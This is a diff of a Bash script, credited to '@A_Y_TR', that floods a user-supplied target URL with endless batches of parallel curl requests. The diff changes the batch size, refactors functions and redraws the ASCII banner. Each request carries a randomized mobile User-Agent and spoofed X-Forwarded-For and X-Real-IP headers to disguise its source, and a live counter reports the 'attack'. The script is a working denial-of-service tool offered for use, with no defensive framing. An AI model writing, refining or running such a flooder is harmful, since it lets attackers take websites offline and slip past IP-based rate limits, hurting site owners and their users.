@@ -4,53 +4,56 @@
 URL=""
 SUCCESS_COUNT=0
 FAILURE_COUNT=0
-THREADS=500  # Number of parallel processes
+THREADS=200
+PORT=4000
 
 # Colors for text
 RED="\e[31m"
 GREEN="\e[32m"
 YELLOW="\e[33m"
 CYAN="\e[36m"
-NC="\e[0m"  # No color
+NC="\e[0m" # No color
 
-# Clear the terminal and print the header in ASCII art
+# Clear the terminal and display the title
 clear
-echo -e "${CYAN}██████╗ ███████╗    ███████╗"
-echo -e "${CYAN}██╔══██╗██╔════╝    ██╔════╝"
-echo -e "${CYAN}██████╔╝█████╗      █████╗  "
-echo -e "${CYAN}██╔═══╝ ██╔══╝      ██╔══╝  "
-echo -e "${CYAN}██║     ███████╗    ██║     "
-echo -e "${CYAN}╚═╝     ╚══════╝    ╚═╝     "
-echo -e "${GREEN}██████╗ ███████╗    ███████╗"
-echo -e "${GREEN}╚════██╗██╔════╝    ██╔════╝"
-echo -e "${GREEN} █████╔╝█████╗      █████╗  "
-echo -e "${GREEN}██╔═══╝ ██╔══╝      ██╔══╝  "
-echo -e "${GREEN}███████╗███████╗    ██║     "
-echo -e "${GREEN}╚══════╝╚══════╝    ╚═╝     "
-echo -e "${YELLOW}-------------------------------------------------${NC}"
-echo -e "${YELLOW}          Developed by @A_Y_TR                  ${NC}"
-echo -e "${YELLOW}-------------------------------------------------${NC}"
+echo -e "${CYAN}"
+echo "██████╗ ███████╗"
+echo "██╔══██╗██╔════╝"
+echo "██║  ██║█████╗  "
+echo "██║  ██║██╔══╝  "
+echo "██████╔╝██"
+echo "╚═════╝ ╚══════╝"
+echo -e "${YELLOW}------------------------------------${NC}"
+echo -e "${YELLOW}   Developed by @A_Y_TR             ${NC}"
+echo -e "${YELLOW}------------------------------------${NC}"
 echo
 
-# Input target URL
-echo -e "${YELLOW}Enter the target URL: ${NC}"
+# Input the target URL
+echo -e "${YELLOW}Enter the target URL (with http or https): ${NC}"
 read -r URL
-echo
 
-# Function to generate a random IP address
+# Function to generate random IP
 generate_random_ip() {
     echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
 }
 
-# Function to send an HTTP request
+# Function to generate random User-Agent
+generate_user_agent() {
+    echo "Mozilla/5.0 (Linux; Android $(shuf -i 4-12 -n 1)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(shuf -i 70-100 -n 1).0.$(shuf -i 1000-4000 -n 1).$(shuf -i 50-150 -n 1) Mobile Safari/537.36"
+}
+
+# Function to send an HTTP/HTTPS request
 send_request() {
     local RANDOM_IP
     RANDOM_IP=$(generate_random_ip)
     local USER_AGENT
-    USER_AGENT="Mozilla/5.0 (Linux; Android $(shuf -i 4-12 -n 1)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(shuf -i 70-100 -n 1).0.$(shuf -i 1000-4000 -n 1).$(shuf -i 50-150 -n 1) Mobile Safari/537.36"
+    USER_AGENT=$(generate_user_agent)
 
-    # Send the request using curl
-    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: $USER_AGENT" -H "X-Forwarded-For: $RANDOM_IP" -H "X-Real-IP: $RANDOM_IP" "$URL")
+    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
+        -H "User-Agent: $USER_AGENT" \
+        -H "X-Forwarded-For: $RANDOM_IP" \
+        -H "X-Real-IP: $RANDOM_IP" \
+        "$URL")
     
     if [[ "$RESPONSE" == "200" ]]; then
         ((SUCCESS_COUNT++))
@@ -59,28 +62,35 @@ send_request() {
     fi
 }
 
-# Start the attack with parallel processes
+# Function to start the attack
 start_attack() {
     while :; do
-        seq 1 $THREADS | xargs -P $THREADS -I {} bash -c 'send_request'
+        for ((i = 0; i < THREADS; i++)); do
+            send_request &
+        done
+        wait
     done
 }
 
-# Display attack statistics including success rate
-print_stats() {
+# Function to display stats
+display_stats() {
     while :; do
-        # Calculate success rate
-        if ((SUCCESS_COUNT + FAILURE_COUNT > 0)); then
-            SUCCESS_RATE=$((SUCCESS_COUNT * 100 / (SUCCESS_COUNT + FAILURE_COUNT)))
-        else
-            SUCCESS_RATE=0
-        fi
-        echo -e "${GREEN}Successful Attacks: ${SUCCESS_COUNT} - Failed Attacks: ${FAILURE_COUNT}"
-        echo -e "${YELLOW}Success Rate: ${SUCCESS_RATE}%${NC}"
+        clear
+        echo -e "${CYAN}██████╗ ███████╗"
+        echo -e "██╔══██╗██╔════╝"
+        echo -e "██║  ██║█████╗  "
+        echo -e "██║  ██║██╔══╝  "
+        echo -e "██████╔╝██╗"
+        echo -e "╚═════╝ ╚══════╝${NC}"
+        echo -e "${GREEN}------------------------------------${NC}"
+        echo -e "Attacking URL: ${YELLOW}${URL}${NC}"
+        echo -e "${GREEN}Successful Requests: ${SUCCESS_COUNT}${NC}"
+        echo -e "${RED}Failed Requests: ${FAILURE_COUNT}${NC}"
+        echo -e "${YELLOW}------------------------------------${NC}"
         sleep 2
     done
 }
 
-# Start the attack and print statistics
+# Run the attack and stats in parallel
 start_attack &
-print_stats
+display_stats
